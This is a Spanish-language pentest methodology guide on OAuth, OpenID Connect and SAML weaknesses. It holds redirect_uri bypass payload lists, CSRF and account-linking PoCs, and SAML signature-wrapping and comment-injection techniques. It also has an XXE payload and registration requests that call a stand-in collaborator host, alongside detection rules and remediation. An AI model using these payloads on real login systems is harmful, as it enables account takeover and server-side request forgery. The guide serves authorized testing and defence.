# OAuth 2.0, OpenID Connect y SAML (federación e inicio de sesión único)

| Clasificación | |
|---|---|
| CWE | CWE-601 — Open Redirect (redirect_uri); CWE-352 — CSRF (state); CWE-287 — Improper Authentication; CWE-347 — Improper Verification of Cryptographic Signature (id_token, SAML); CWE-294 — Authentication Bypass by Capture-replay; CWE-611 — XXE (SAML); CWE-918 — SSRF (registro dinámico, request_uri) |
| OWASP Top 10:2025 | A07 — Authentication Failures (A01 si el resultado es acceso a recursos ajenos; A05 para XXE en SAML) |
| OWASP API Top 10:2023 | API2 — Broken Authentication |
| WSTG | WSTG-ATHZ-05 (Testing for OAuth Weaknesses: 05.1 Authorization Server, 05.2 OAuth Client); WSTG-ATHN-04; WSTG-SESS-05 (CSRF en el flujo) |

**Contenido:** 1. Qué es · 2. Dónde buscar · 3. Detección segura · 4. Explotación: 4.1 redirect_uri · 4.2 state y CSRF · 4.3 flujo implícito y fugas de token · 4.4 PKCE · 4.5 código y endpoint de token · 4.6 scopes · 4.7 vinculación de cuentas y pre-toma · 4.8 validación de OIDC/id_token · 4.9 registro dinámico y SSRF · 4.10 SAML · 5. Evasión · 6. Escalada · 7. Caja blanca · 8. Falsos positivos · 9. Evidencia · 10. Severidad · 11. Remediación · 12. Herramientas · 13. Referencias

---

## 1. Qué es y por qué ocurre

- **OAuth 2.0** es un protocolo de **autorización delegada**: un usuario (*resource owner*) permite a una aplicación cliente (*client*) acceder a sus recursos en un servidor de recursos mediante un **token de acceso** que emite el **servidor de autorización** (AS, a menudo llamado IdP). Flujos principales: *authorization code* (con **PKCE**, *Proof Key for Code Exchange*, una prueba que liga el código al cliente que lo pidió), *client credentials*, *device code*; el **implícito** (`response_type=token`) y el de contraseña (ROPC) están desaconsejados (OAuth 2.0 Security BCP, RFC 9700, y OAuth 2.1).
- **OpenID Connect (OIDC)** añade autenticación sobre OAuth: el **`id_token`** es un JWT que afirma quién es el usuario para un cliente concreto (`aud`), con `nonce` contra repeticiones.
- **SAML 2.0** es un estándar XML de inicio de sesión único: el proveedor de identidad (IdP) envía al proveedor de servicio (SP) una **aserción** firmada con XML Signature.

Por qué fallan: el flujo pasa por el navegador (canal frontal) y cada parámetro (`redirect_uri`, `state`, `code`, `scope`, `response_type`, `response_mode`) es manipulable; validaciones de URL por prefijo o expresión regular; ausencia de `state`/`nonce`/PKCE; clientes que identifican al usuario por `email` en lugar de `sub`+`iss`; confianza en datos del navegador en lugar de validar tokens en el servidor; y, en SAML, la complejidad de XML Signature (qué nodo está firmado frente a qué nodo lee la aplicación).

## 2. Dónde buscar (señales del reconocimiento)

- Botones "Iniciar sesión con Google/Microsoft/GitHub/Apple", "Conectar cuenta", integraciones (Slack, Drive), SSO corporativo.
- Parámetros en el proxy: `client_id`, `redirect_uri`, `response_type`, `response_mode`, `scope`, `state`, `nonce`, `code`, `code_challenge`, `code_challenge_method`, `prompt`, `login_hint`, `request`, `request_uri`, `SAMLRequest`, `SAMLResponse`, `RelayState`.
- Descubrimiento: `/.well-known/openid-configuration`, `/.well-known/oauth-authorization-server`, `jwks_uri`, `registration_endpoint`, `/saml/metadata`, `/simplesaml/`, `/adfs/ls/`, `/FederationMetadata/2007-06/FederationMetadata.xml`.
- Callbacks: `/callback`, `/oauth/callback`, `/auth/<proveedor>/callback`, `/login/oauth2/code/<id>`, `/saml/acs`, `/sso/saml`.
- Secretos de cliente en JS, apps móviles, repositorios (`client_secret`), y esquemas personalizados en apps móviles (`com.app://oauth`).
- Páginas de callback que cargan recursos de terceros (analítica, imágenes): candidatas a fuga del `code` por `Referer`.

## 3. Detección segura (primeras sondas, no destructivas)

Prerrequisitos: dos cuentas del auditor en el IdP y en la aplicación (`A` = atacante, `B` = víctima simulada), un servidor de colaboración (Burp Collaborator/interactsh) y un dominio propio. Captura el flujo completo legítimo y mapéalo antes de tocar nada.

1. **Mapear**: qué flujo y qué `response_type`; si hay `state`, `nonce`, PKCE; qué parámetros se validan en `/authorize` y cuáles en `/token`.
2. **`redirect_uri`**: cambia un elemento cada vez (ruta, subdominio, parámetro, esquema) y observa si el AS **redirige** (vulnerable) o muestra error. No necesitas víctima: el propio AS te dice si acepta la URL.
3. **`state`**: elimínalo, déjalo vacío o reutiliza uno antiguo y comprueba si el cliente acepta el callback.
4. **PKCE**: elimina `code_challenge`; intercambia el código sin `code_verifier` o con uno incorrecto.
5. **Código**: intenta canjear dos veces el mismo `code` (solo tu cuenta) y con otro `redirect_uri`.
6. **SAML**: decodifica la respuesta y comprueba qué está firmado (respuesta, aserción o ambas); prueba primero eliminar la firma sin cambiar el usuario.

⚠️ El robo real de códigos o tokens de usuarios distintos del auditor, el envío de enlaces maliciosos a empleados o la vinculación de cuentas reales **requiere confirmación explícita del cliente**; las pruebas de concepto se hacen entre `A` y `B`.

## 4. Explotación por contexto o tecnología

### 4.1 Bypass de `redirect_uri`

Partiendo de `redirect_uri=https://client.tld/callback` registrado:

```text
https://client.tld/callback/../../redirect?to=https://atacante.tld       (traversal hacia una redirección abierta)
https://client.tld/callback/..%2f..%2fredirect%3fto%3dhttps://atacante.tld
https://client.tld/callback?next=https://atacante.tld                    (parámetros extra si se compara por prefijo)
https://client.tld/callback/%2e%2e/%2e%2e/ruta-con-xss
https://client.tld.atacante.tld/callback                                 (validación por prefijo de host)
https://atacante.tld/client.tld/callback  ·  https://atacante.tld/?client.tld/callback   (regex sin anclar)
https://client.tld@atacante.tld/callback  ·  https://client.tld%40atacante.tld
https://client.tld\@atacante.tld  ·  https://client.tld%5c@atacante.tld  ·  https://client.tld%2f@atacante.tld
https://atacante.tld#.client.tld  ·  https://atacante.tld%23.client.tld
https://cualquier-sub.client.tld/callback                                (comodín de subdominio + XSS o subdomain takeover)
https://CLIENT.tld/callback  ·  https://client.tld:443/callback  ·  https://client.tld./callback
http://client.tld/callback                                               (degradación a HTTP)
http://localhost.atacante.tld/  ·  http://127.0.0.1:31337/               (clientes nativos con loopback)
redirect_uri=https://client.tld/callback&redirect_uri=https://atacante.tld   (HPP entre /authorize y /token)
```

- Si `redirect_uri` solo admite rutas del cliente, busca allí: **redirecciones abiertas** (`vulns/open-redirect.md`), **XSS** (`vulns/xss.md`), páginas que filtran la URL por `Referer` (imágenes o scripts de terceros, enlaces salientes) o con *listeners* `postMessage` sin comprobar origen.
- Si el AS no comprueba `redirect_uri` en `/token` pero sí en `/authorize`, o viceversa, combina ambos.
- **Dirty dancing** (Frans Rosén): fuerza un error en el cliente para que el `code` o el token se quede en una URL que luego se filtra: cambiar `response_type` (`code` → `code id_token` o `token`, que devuelve en el fragmento), `response_mode` (`query` ↔ `fragment` ↔ `form_post` ↔ `web_message`) o enviar un `state` inválido; la página de error no consume el código y lo expone a scripts de terceros, a `Referer` o a un `postMessage` abierto.
- Apps móviles: otro app puede registrar el mismo esquema personalizado y recibir el código; con PKCE bien aplicado el código robado no sirve.

Prueba de concepto: con la cuenta `B` en el navegador, visita la URL manipulada y muestra el `code` llegando a tu servidor de colaboración; después canjéalo o completa el callback desde la sesión de `A` y demuestra que entras como `B`.

### 4.2 `state` ausente o no ligado (CSRF en el flujo)

`state` debe ser aleatorio, ligado a la sesión del navegador y de un solo uso.

- **Login CSRF**: sin `state`, el atacante obtiene un callback válido para *su* cuenta (`/callback?code=<code_de_A>`) y hace que la víctima lo visite: la víctima queda dentro de la cuenta del atacante y lo que introduzca (tarjeta, documentos) queda a su alcance.
- **Vinculación forzada** (*forced account linking*): en "Conectar cuenta de X", el atacante inicia el flujo con su cuenta social, **detiene** la petición de callback, y entrega esa URL a la víctima autenticada en la aplicación; la cuenta social del atacante queda vinculada a la cuenta de la víctima y le permite iniciar sesión como ella.

```html
<!-- PoC entre cuentas del auditor: B (sesión abierta en la app) visita esta página -->
<img src="https://client.tld/oauth/link/callback?code=<code_emitido_para_A>">
```

- Prueba también: `state` presente pero no validado, validado solo si existe (elimínalo), reutilizable, o igual en todos los flujos.
- En OIDC, `nonce` cumple la función equivalente para el `id_token`.

### 4.3 Flujo implícito y fugas de token

- Con `response_type=token` el token llega en el fragmento (`#access_token=…`). El fragmento no se envía en `Referer`, pero puede filtrarse a través de redirecciones (los navegadores conservan el fragmento al redirigir), por scripts de terceros en la página de callback, por el historial y por `postMessage` con origen `*`.
- **Bypass de autenticación en implícito**: el cliente envía a su backend `{"email":"…","token":"…"}` y el backend confía en el email sin validar el token contra el AS. Cambia el email al de la cuenta `B` manteniendo el token de `A`.
- Tokens de acceso o códigos en query string que aparecen en logs, en `Referer` hacia terceros, en la caché de la CDN o en el historial.
- Tokens guardados en `localStorage` accesibles por cualquier XSS.

### 4.4 PKCE: ausencia o degradación

```text
1. Eliminar code_challenge y code_challenge_method en /authorize → ¿se emite código?
2. code_challenge_method=plain cuando el AS anuncia S256 → el challenge es el propio verifier (si se filtra la URL, se filtra todo)
3. En /token: omitir code_verifier, o enviar uno erróneo → ¿se emiten tokens?
4. Código emitido con PKCE canjeado sin verifier por otro client_id
```

PKCE no evita la falta de `state`, pero sí que un código robado se pueda canjear.

### 4.5 Código de autorización y endpoint de token

- **Reutilización** del código (debe ser de un solo uso; si se reutiliza, el AS debería revocar los tokens emitidos con él).
- **Código no ligado al cliente**: canjear con `client_id` distinto o en un cliente público sin autenticación.
- **Inyección de código** (*code injection*): introducir en la sesión de `A` un código robado de `B`; sin PKCE ni `nonce`, el cliente acepta.
- **Secreto de cliente expuesto** en JS/apps: permite canjear códigos robados y usar `client_credentials` (comprueba qué scopes otorga).
- Tokens de refresco no rotados, sin detección de reutilización o no ligados al cliente.
- **Mix-up** (varios IdPs en el mismo cliente): el cliente envía un código de un IdP honesto al endpoint de token de un IdP malicioso; la mitigación es el parámetro `iss` en la respuesta de autorización (RFC 9207).

### 4.6 Escalada de scopes

```text
/authorize?...&scope=openid profile                       (consentimiento mostrado)
POST /token ... &scope=openid profile admin write:all     (pedir más en el canje o en el refresco)
POST /token grant_type=refresh_token&refresh_token=…&scope=admin
```

Comprueba si el token resultante incluye scopes no consentidos (introspección `POST /introspect`, o decodificando el JWT) y si el servidor de recursos los respeta. Prueba también scopes de otros clientes y `offline_access` para obtener refresh tokens.

### 4.7 Vinculación de cuentas, pre-toma y confianza en el email

- **Fusión por email**: el cliente vincula la identidad social a la cuenta local que tiene el mismo email sin comprobar `email_verified` o con un IdP que permite emails no verificados o mutables. Con un tenant propio de un IdP multi-tenant (o una cuenta donde el email es editable) se fija el email de la víctima. Caso conocido: "nOAuth" en Microsoft Entra ID (2023), aplicaciones que usaban el claim mutable `email` en lugar de `sub`/`oid`.
- **Pre-toma de cuenta**: registrar localmente `victima@empresa.tld` sin verificar; cuando la víctima entra después por SSO, la cuenta se fusiona y el atacante conserva su contraseña. PoC con un email del auditor sin cuenta previa (ver `vulns/authentication.md`).
- **Desvinculación**: eliminar el último método de login, o desvincular la cuenta social de otro usuario por IDOR (`vulns/access-control-idor.md`).

### 4.8 Validación del `id_token` (OIDC) y de tokens en el cliente

Ataques sobre un `id_token` propio (ver técnicas en `vulns/jwt.md`):
- Firma no verificada, `alg:none`, confusión RS→HS.
- `aud` no comprobado: usar un `id_token` emitido para **otra aplicación** del mismo IdP (por ejemplo una app propia del atacante registrada en Google) para entrar en el cliente objetivo.
- `iss` no comprobado: tokens de otro tenant del mismo proveedor (multi-tenant de Entra ID: aceptar cualquier `tid`).
- `nonce` ausente o no comprobado: repetición de `id_token`.
- `exp` ignorado; `at_hash`/`c_hash` no comprobados en flujo híbrido.
- El API acepta `id_token` como token de acceso.

### 4.9 Registro dinámico de clientes, `request_uri` y SSRF

Si `registration_endpoint` está abierto (RFC 7591), el AS descargará URLs que tú controlas:

```http
POST /register HTTP/1.1
Host: idp.target.tld
Content-Type: application/json

{"redirect_uris":["https://client.tld/callback"],
 "logo_uri":"https://corvus-collab.oastify.example/logo.png",
 "jwks_uri":"https://corvus-collab.oastify.example/jwks.json",
 "sector_identifier_uri":"https://corvus-collab.oastify.example/sector.json",
 "request_uris":["https://corvus-collab.oastify.example/req.jwt"]}
```

- También `/authorize?request_uri=https://corvus-collab…/req.jwt` (JAR por referencia). Si llegan peticiones, hay **SSRF**; escala solo con la metodología de `vulns/ssrf.md`.
- Comprueba si el registro permite `redirect_uris` arbitrarias que después aparecen en la pantalla de consentimiento con el nombre y logo del cliente legítimo (phishing de consentimiento).

### 4.10 SAML

Decodificar (binding POST = Base64; binding Redirect = Base64 + DEFLATE):

```bash
echo "$SAMLResponse" | base64 -d | xmllint --format -
python3 -c "import sys,zlib,base64,urllib.parse;print(zlib.decompress(base64.b64decode(urllib.parse.unquote(sys.argv[1])),-15).decode())" "$SAMLRequest"
```

Ataques, de menor a mayor complejidad (siempre empezando sin cambiar el `NameID`):

1. **Firma eliminada** (*signature exclusion*): borrar `<ds:Signature>` de la aserción y de la respuesta.
2. **Certificado propio**: re-firmar con un certificado autofirmado (SAML Raider → *Clone certificate* y *Self-sign*); vulnerable si el SP usa el certificado embebido en `KeyInfo` en vez del de los metadatos.
3. **Firma de la respuesta pero no de la aserción** (o al revés): modificar la parte no firmada.
4. **XML Signature Wrapping (XSW1–XSW8)**: mover la aserción firmada original a otro lugar y colocar una aserción falsificada donde la aplicación la leerá; la firma sigue siendo válida porque referencia el ID del nodo original. SAML Raider automatiza las ocho variantes.
5. **Inyección de comentarios** en `NameID` (CVE-2017-11427/11428/11429/11430 y otras): registra en el IdP `admin@target.tld.atacante.tld`; la aserción firmada contiene ese valor y se modifica añadiendo un comentario, lo que no rompe la firma (la canonicalización elimina comentarios):
   ```xml
   <saml:NameID>admin@target.tld<!---->.atacante.tld</saml:NameID>
   ```
   Librerías que leen solo el primer nodo de texto obtienen `admin@target.tld`.
6. **XXE** (el SP parsea antes de validar la firma) y **XSLT** en `<ds:Transforms>`:
   ```xml
   <?xml version="1.0"?>
   <!DOCTYPE r [<!ENTITY % x SYSTEM "https://corvus-collab.oastify.example/saml.dtd"> %x;]>
   <samlp:Response ...>
   ```
   Ver `vulns/xxe.md`.
7. **Repetición y contexto**: reutilizar una respuesta ya consumida; `InResponseTo` no comprobado (IdP-initiated aceptado sin solicitud); `NotOnOrAfter`/`NotBefore` ignorados; `Audience`, `Recipient` o `Destination` no comprobados (una aserción emitida para **otro SP** del mismo IdP se acepta).
8. **Diferenciales de parser**: la validación de firma y la extracción de atributos usan parsers XML distintos (ruby-saml CVE-2024-45409 y CVE-2025-25291/25292); relevantes si la huella apunta a esas librerías y versiones.
9. **`RelayState`** como redirección abierta tras el login (`vulns/open-redirect.md`).

## 5. Evasión de filtros y WAF

- Codificaciones dobles y mixtas en `redirect_uri` (`%252f`, `%5c`, `%09`, `%0d%0a`), mayúsculas en esquema y host, puntos finales, puertos explícitos, IDN/punycode (`xn--`).
- Mover parámetros entre query y cuerpo (`/authorize` acepta `POST`), duplicarlos (HPP, `vulns/parameter-pollution.md`), o usar `request` (objeto JWT firmado o sin firmar con `alg:none`) para pasar `redirect_uri` sin que el filtro lo vea.
- En SAML, espacios de nombres alternativos (prefijos distintos de `saml:`/`ds:`), codificación de entidades en el `NameID`, y respuestas comprimidas en binding Redirect.

## 6. Escalada y encadenamiento (demostrar impacto máximo sin causar daño)

- **Redirección abierta + `redirect_uri` laxo → robo de código → toma de cuenta**. PoC: `B` hace clic, el código llega al colaborador, `A` lo canjea y accede como `B`.
- **XSS en el dominio del cliente → robo de tokens** del fragmento o de `localStorage`.
- **Falta de `state` → vinculación forzada → toma de cuenta persistente**.
- **Email no verificado/mutable → toma de cuenta por SSO** en cualquier usuario cuyo email se conozca. ⚠️ Probar con emails de empleados o clientes reales **requiere confirmación explícita del cliente**; usa una cuenta `B` del auditor.
- **Bypass de firma SAML → cualquier usuario, incluido admin**. Demuéstralo autenticándote como la cuenta `B` del auditor; ⚠️ autenticarse como un administrador real **requiere confirmación explícita del cliente**.
- **Registro dinámico → SSRF → metadatos de nube** (`vulns/ssrf.md`).
- **Scope escalado → API administrativa** con el token de `A`.

## 7. Caja blanca: fuentes, sumideros y patrones de código

```js
// Validación de redirect_uri (servidor de autorización)
if (redirectUri.startsWith(client.redirectUri)) ok();                // vulnerable: prefijo
if (/https:\/\/.*\.client\.tld/.test(redirectUri)) ok();             // vulnerable: regex sin anclar ni escapar
if (client.redirectUris.includes(redirectUri)) ok();                 // seguro: coincidencia exacta de cadena

// Cliente: state y PKCE (openid-client v5; la v6 expone funciones equivalentes como randomState/randomPKCECodeVerifier)
const state = generators.state(); const nonce = generators.nonce();
const verifier = generators.codeVerifier();
req.session.oidc = { state, nonce, verifier };
const url = client.authorizationUrl({ scope: 'openid email', state, nonce,
  code_challenge: generators.codeChallenge(verifier), code_challenge_method: 'S256' });
// callback
const tokens = await client.callback(REDIRECT, client.callbackParams(req), req.session.oidc); // valida state, nonce, firma, aud, iss
const userKey = `${tokens.claims().iss}|${tokens.claims().sub}`;     // identificar por iss+sub, nunca solo por email
```

```python
# Vulnerable: identifica por email sin email_verified y sin validar id_token
claims = jwt.decode(id_token, options={"verify_signature": False})
user = User.objects.get(email=claims["email"])
# Seguro
claims = jwt.decode(id_token, jwks_key, algorithms=["RS256"], audience=CLIENT_ID, issuer=ISSUER)
assert claims["nonce"] == session.pop("nonce")
ident = Identity.objects.get(issuer=claims["iss"], subject=claims["sub"])
```

SAML — configuración a revisar:
- python3-saml/OneLogin: `strict: true`, `security.wantAssertionsSigned`, `wantMessagesSigned`, `rejectDeprecatedAlgorithm`.
- `@node-saml/passport-saml`: `idpCert` (antes `cert`) fijo, `wantAssertionsSigned: true`, `wantAuthnResponseSigned`, `validateInResponseTo`, `audience`, `acceptedClockSkewMs` pequeño.
- Java (OpenSAML/Spring Security SAML2): validar firma con el certificado de metadatos, `SignatureTrustEngine`, perfil de validación de aserciones con `Audience`/`Recipient`/`InResponseTo`; parser con DTD deshabilitado.
- Uso de `getElementsByTagName('NameID')[0].firstChild` o similares (lectura del primer nodo de texto → inyección de comentarios).

```bash
rg -n -i 'redirect_?uri.{0,60}(startsWith|indexOf|includes|match|contains|endsWith|re\.(search|match))'
rg -n -i 'state' -g '*oauth*' -g '*callback*' | rg -i -v 'session|compare|verify'
rg -n -i '(email_verified|claims\[.email.\]|\.email\b).{0,80}(find|get|where|filter)'
rg -n -i 'verify_signature.{0,5}False|wantAssertionsSigned\s*[:=]\s*false|strict.{0,5}(false|False)|validateInResponseTo\s*:\s*(false|.never.)'
rg -n -i 'code_challenge_method.{0,20}plain|response_type.{0,10}token\b|grant_type.{0,10}password'
rg -n 'firstChild|childNodes\[0\]|\.text\(\)' -g '*saml*'
```
```yaml
rules:
- id: corvus-redirect-uri-prefix
  languages: [javascript, typescript, python, java]
  severity: ERROR
  message: redirect_uri validado por prefijo/subcadena; exigir coincidencia exacta
  patterns:
    - pattern-either:
        - pattern: $X.startsWith(...)
        - pattern: $X.startswith(...)
        - pattern: $X.indexOf(...) == 0
    - metavariable-regex:
        metavariable: $X
        regex: (?i).*redirect.*
```

## 8. Falsos positivos frecuentes

- El AS acepta el `redirect_uri` manipulado en `/authorize` pero lo rechaza en `/token`: el código robado no es canjeable sin PKCE/secreto. Sigue siendo un hallazgo si hay flujo implícito o híbrido; si no, severidad baja.
- `redirect_uri` hacia otra ruta del mismo cliente sin forma de extraer el código (sin redirección abierta, XSS ni recursos de terceros): documentar como debilidad, no como robo de cuenta.
- `state` ausente en el login pero con cookie `SameSite=Lax`/PKCE ligado a sesión que impide el login CSRF: verifica con un PoC real entre dos navegadores.
- La aserción SAML sin firma es rechazada después en el backend aunque el *frontend* la acepte; confirma con acceso a un recurso autenticado.
- Scope extra devuelto en la respuesta del token pero ignorado por el servidor de recursos.
- Aplicaciones que fusionan por email pero solo con IdPs que garantizan verificación (Google con dominio propio): comprueba si existe un IdP con email no verificado antes de reportar.

## 9. Evidencia mínima para validarlo

- Flujo legítimo capturado y flujo manipulado, con el parámetro modificado resaltado.
- Para robo de código/token: la URL enviada a `B`, el registro del colaborador con el `code`/token de `B`, la petición de canje o de callback desde `A` y una respuesta que muestre la identidad de `B`.
- Para CSRF/vinculación: página PoC, petición generada desde el navegador de `B` y estado final (cuenta social de `A` vinculada a `B`), con su reversión.
- Para SAML: respuesta original y manipulada (XML legible), técnica (XSW n.º, comentario, firma eliminada) y la sesión resultante.
- Para SSRF por registro dinámico: petición de registro y la interacción recibida.

## 10. Severidad orientativa (vectores CVSS 3.1 y 4.0 típicos según impacto demostrado)

| Escenario demostrado | CVSS 3.1 | CVSS 4.0 (vector) |
|---|---|---|
| Robo de código/token vía `redirect_uri` → toma de cuenta (requiere clic) | `AV:N/AC:L/PR:N/UI:R/S:U/C:H/I:H/A:N` (8.1) | `CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:P/VC:H/VI:H/VA:N/SC:N/SI:N/SA:N` |
| Vinculación forzada sin `state` → toma de cuenta | `AV:N/AC:L/PR:N/UI:R/S:U/C:H/I:H/A:N` (8.1) | `CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:A/VC:H/VI:H/VA:N/SC:N/SI:N/SA:N` |
| Login CSRF (víctima dentro de la cuenta del atacante) | `AV:N/AC:L/PR:N/UI:R/S:U/C:L/I:L/A:N` (5.4) | `CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:A/VC:L/VI:L/VA:N/SC:N/SI:N/SA:N` |
| SSO por email no verificado / `aud` no validado → cualquier cuenta | `AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:N` (9.1) | `CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:H/VI:H/VA:N/SC:N/SI:N/SA:N` |
| Bypass de firma SAML → cualquier usuario, incluido admin | `AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H` (9.8) | `CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:H/VI:H/VA:H/SC:N/SI:N/SA:N` (9.3) |
| Ausencia de PKCE / `state` sin explotación demostrada | `AV:N/AC:H/PR:N/UI:R/S:U/C:L/I:L/A:N` (4.2) | `CVSS:4.0/AV:N/AC:H/AT:P/PR:N/UI:A/VC:L/VI:L/VA:N/SC:N/SI:N/SA:N` |

Si el IdP comprometido da acceso a varias aplicaciones (SSO corporativo), refleja el impacto en sistemas subsiguientes. Calcula la puntuación 4.0 exacta en la calculadora de FIRST.

## 11. Remediación (con ejemplo de código correcto)

- Authorization Code + PKCE (`S256`) para todos los clientes; deshabilitar implícito y ROPC (RFC 9700, OAuth 2.1).
- `redirect_uri` registrado y comparado por **igualdad exacta de cadena** en `/authorize` y en `/token`; sin comodines; sin redirecciones abiertas en las rutas de callback.
- `state` aleatorio ligado a la sesión y de un solo uso; `nonce` en OIDC; parámetro `iss` en la respuesta (RFC 9207) cuando hay varios IdPs.
- Códigos de un solo uso, vida corta (≤ 60 s), ligados a `client_id` y `redirect_uri`; refresh tokens rotativos con detección de reutilización o ligados al emisor (DPoP, mTLS).
- Validación completa del `id_token` (firma con JWKS del emisor, `alg` fijo, `iss`, `aud`, `exp`, `nonce`) y de tokens de acceso en el servidor de recursos (audiencia correcta, nunca un `id_token`).
- Identificar a los usuarios por `iss`+`sub`; fusionar cuentas solo con email verificado y con confirmación del usuario autenticado.
- Página de callback sin recursos de terceros y con `Referrer-Policy: no-referrer`; tokens fuera de `localStorage` (cookies `__Host-`, HttpOnly, o patrón BFF, *backend for frontend*).
- Registro dinámico deshabilitado o autenticado, sin descargas de URLs internas; PAR (RFC 9126) para proteger los parámetros del canal frontal.
- SAML: validar la firma con el certificado de los metadatos (nunca el de `KeyInfo`), exigir aserciones firmadas, usar el nodo exacto que se verificó (referencias por ID tras validar), canonicalización sin comentarios en la extracción, parser sin DTD/entidades, comprobar `Audience`, `Recipient`, `Destination`, `InResponseTo`, `NotOnOrAfter` y caché de IDs consumidos contra repeticiones. Mantener actualizadas las librerías SAML.

```python
# Spring/Python/Node varían; en un AS propio, la validación correcta es simple y exacta
def validate_redirect(client, redirect_uri: str) -> str:
    if redirect_uri not in client.registered_redirect_uris:   # lista de cadenas exactas
        raise InvalidRequest("redirect_uri no registrado")
    return redirect_uri
```

## 12. Herramientas (comando y cuándo usarla; automatización solo tras confirmación manual, nunca como primer barrido)

- **Burp Suite** (Proxy, Repeater): manipulación manual de cada parámetro del flujo; **Burp Collaborator** o **interactsh-client** para recibir códigos, tokens y peticiones SSRF.
- **SAML Raider** (Burp): decodificar, editar, eliminar firma, re-firmar con certificado clonado y aplicar XSW1–8.
- **JWT Editor / jwt_tool** para `id_token` y tokens de acceso JWT (ver `vulns/jwt.md`).
- **EsPReSSO** (Burp): reconoce y analiza flujos SSO (OAuth, OIDC, SAML).
- `curl -s https://idp.target.tld/.well-known/openid-configuration | jq` para mapear endpoints, `grant_types_supported`, `code_challenge_methods_supported`, `registration_endpoint`.
- `xmllint`, `xmlsec1 --verify` para examinar firmas SAML; Python para (de)codificar el binding Redirect.
- **semgrep / ripgrep** (sección 7).

## 13. Referencias

- RFC 6749 (OAuth 2.0), RFC 6819 (Threat Model), RFC 7636 (PKCE), RFC 7591 (Dynamic Client Registration), RFC 9126 (PAR), RFC 9207 (Authorization Server Issuer Identification), RFC 9449 (DPoP), RFC 9700 (OAuth 2.0 Security Best Current Practice); borrador OAuth 2.1.
- OpenID Connect Core 1.0 (validación de `id_token`); OASIS SAML 2.0 Core y Security Considerations.
- OWASP WSTG — WSTG-ATHZ-05 (OAuth Weaknesses); OWASP Cheat Sheets: OAuth 2.0, SAML Security.
- PortSwigger Web Security Academy — OAuth 2.0 authentication vulnerabilities; Michael Stepankin, "Hidden OAuth attack vectors" (2021).
- Frans Rosén, "Account hijacking using dirty dancing in sign-in OAuth-flows" (Detectify Labs, 2022).
- Duo Labs, "Duo Finds SAML Vulnerabilities Affecting Multiple Implementations" (2018, inyección de comentarios); Somorovsky et al., "On Breaking SAML: Be Whoever You Want to Be" (USENIX Security 2012, XSW).
- GitHub Security Lab, "Sign in as anyone: Bypassing SAML SSO authentication with parser differentials" (2025); avisos de ruby-saml CVE-2024-45409, CVE-2025-25291, CVE-2025-25292.
- Descope, "nOAuth: How Microsoft OAuth Misconfiguration Can Lead to Full Account Takeover" (2023).
- PayloadsAllTheThings — OAuth Misconfiguration, SAML Injection; HackTricks — OAuth to Account takeover, SAML Attacks.
